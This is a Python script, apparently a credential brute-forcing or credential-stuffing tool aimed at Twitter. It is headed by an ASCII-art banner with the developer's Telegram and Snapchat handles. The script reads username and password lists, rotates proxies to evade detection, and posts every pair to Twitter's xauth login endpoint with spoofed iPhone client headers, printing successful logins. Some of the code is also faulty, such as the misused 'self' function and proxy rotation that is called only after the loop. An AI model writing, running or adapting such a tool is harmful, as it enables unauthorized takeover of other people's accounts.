import requests
import sys, time, random
from proxylist import ProxyList
import logging
import mechanize



print ('''\033[1;36m

    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,       v3.1 forever   
        **************************************
        * -> Development: 0xfff0800          *
        * -> Telegram: https://T.me/xfff0800 *
        * -> snapchat: flaah999              *
        ************************************** 

\033[1;36m''')


b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

token = input('Authorization : ')

def self():
    self.r = '\033[31m'
    self.g = '\033[32m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    self.m = '\033[35m'
    self.c = '\033[36m'
    self.w = '\033[1;36m'


user = input("\033[1;37mEnter username-List : ")
userList = open(user).read().splitlines()
password = input("\033[1;37mEnter the password-List : ")
passList = open(password).read().splitlines()
proxyList = input('\033[1;37mproxy : \033[1;37m')

def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('\033[1;31m[!] Proxy File format has incorrect | EXIT...\033[1;31m')
    pl.random()
    getProxy = pl.random().address()
    b.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = b.open("https://api.myip.com", timeout=2)
    except:
        return proxy()

def FLO():
    self.r = '\033[31m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    for password in passList:
        for user in userList:
            headers = {'Host': 'api.twitter.com',
                       'X-Twitter-Client-DeviceID': '2DF800BC-52AE-4EED-8619-3427BFBCEB19',
                       'Accept': 'application/json',
                       'X-Twitter-Client-Version': '7.31.2',
                       'X-Guest-Token': '1356087735463895046',
                       'X-Client-UUID': 'B984B70C-9E25-46BD-AE02-7C06D6ADD480',
                       'X-Twitter-Client-Language': 'ar',
                       'X-B3-TraceId': 'b523255bd3c50909',
                       'Authorization': ''+token+'',
                       'Accept-Language': 'ar',
                       'Accept-Encoding': 'gzip, deflate',
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'Content-Length': '872',
                       'User-Agent': 'Twitter-iPhone/7.31.2 iOS/12.4 (Apple;iPhone8,1;;;;;1;2015)',
                       'Connection': 'close',
                       'X-Twitter-Client-Limit-Ad-Tracking': '0',
                       'X-Twitter-API-Version': '5',
                       'X-Twitter-Client': 'Twitter-iPhone',
                       'kdt': 'WVNNhlHWK0zfTy1ccU1lcKpZy6jDOv2RU9G4mOFv'}

            data = 'x_auth_identifier=' + user + '&x_auth_password=' + password + ''



            r = requests.post('https://api.twitter.com/auth/1/xauth_password.json', headers=headers,
                              data=data, timeout=2).text


            if 'errors' in r:
                print(self.r + '[-] NO ! {} : {}'.format(user, password))
            else:
                print(self.w + '[+] Good ^_^ => {} : {}'.format(user, password))



if __name__ == '__main__':
    self()
    FLO()
    proxy()
